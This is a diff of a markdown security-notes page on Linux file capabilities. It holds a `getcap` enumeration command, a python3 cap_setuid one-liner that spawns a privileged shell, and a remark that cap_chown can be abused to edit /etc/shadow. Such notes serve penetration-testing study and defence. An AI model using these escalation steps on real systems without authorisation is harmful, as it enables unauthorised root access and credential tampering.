@@ -77,18 +77,18 @@ Find executables with capabilities
 
 ```ps
 $ getcap -r / 2>/dev/null
+/usr/bin/python3 = cap_setuid
+$ /usr/bin/python3 -c 'import os; os.execl("/bin/sh", "sh", "-p")'
 ```
-</div><div>
 
 ➡️ Look for the executable on [GTFOBins](../tools/gtfobins.md)
 
 ➡️ Use the same techniques as for [SUID/GUID](#suidguid-bit) files not on GTFOBins
+</div><div>
 
-```ps
-$ getcap -r / 2>/dev/null
-/usr/bin/python3 = cap_setuid
-$ /usr/bin/python3 -c 'import os; os.execl("/bin/sh", "sh", "-p")'
-```
+There are roughly 40 capabilities:
+
+* `cap_chown`: could take over `/etc/shadow` to edit a password
 </div></div>
 
 <hr class="sep-both">
